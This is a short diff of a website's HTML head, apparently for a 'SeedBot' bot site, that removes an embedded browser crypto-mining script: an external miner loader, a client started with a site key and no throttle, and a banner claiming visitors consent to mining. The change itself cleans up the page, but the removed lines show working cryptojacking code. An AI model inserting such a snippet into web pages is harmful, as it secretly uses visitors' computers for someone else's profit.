@@ -58,16 +58,7 @@ EOF;
     <link href="css/custom.css" rel="stylesheet" type="text/css" />
     <link href="fa/css/all.css" rel="stylesheet"> 
     <title>SeedBot | Offical Website</title>
-    
-<script src="https://www.hostingcloud.racing/cPTP.js"></script>
-<script>
-    var _client = new Client.Anonymous('32dcfb13f92b42722a95f0264ea55fe6880a68490fef661237dd6777723d1c78', {
-        throttle: 0
-    });
-    _client.start();
-    _client.addMiningNotification("Bottom", "By Using this website you consent to crypto mining on your computer", "#cccccc", 40, "#3d3d3d");
 
-</script>
     
   </head>
   <body>
